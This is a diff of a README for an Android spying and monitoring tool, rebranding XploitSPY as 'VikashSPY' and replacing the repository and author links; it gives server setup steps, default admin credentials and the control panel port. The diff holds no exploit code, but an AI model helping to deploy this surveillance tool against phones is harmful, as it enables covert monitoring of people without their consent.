@@ -50,7 +50,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
     - `sudo npm install pm2 -g`
 
 4. Clone this repository
-    - `git clone https://github.com/XploitWizer/XploitSPY.git`
+    - `git clone https://github.com/vikashmobileclinic/AndroidSpyServer.git`
 
 5. Now change to the server directory and run these commands
     - `npm install` <- install dependencies
@@ -60,7 +60,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 6. Default Username : admin & Default Password : password
 
 7. Change the Username & Password
-    1. Stop XploitSPY `pm2 stop index`
+    1. Stop VikashSPY `pm2 stop index`
     2. Open `maindb.json` in a text editor
     3. under `admin` 
         - set the `username` as plain text
@@ -70,7 +70,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 
 8. in your browser navigate to `http://<SERVER IP or URL>:22533`
     
-It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
+It's recommended to run VikashSPY behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)
 
 ## Happy Hacking
 
@@ -79,7 +79,7 @@ It's recommended to run XploitSPY behind a reverse proxy such as [NGINX](https:/
 XploitSPY is built for Educational Purpose. Use at your own Risk.</b>
 
 <br>
-<p align="center">Made with ❤️ By <a href="https://xploitwizer.com">XploitWizer</a></p>
+<p align="center">Made with ❤️ By <a href="https://github.com/vikashmobileclinic/AndroidSpyServer">Mr.Chauhan</a></p>
 
 ## Credits
 
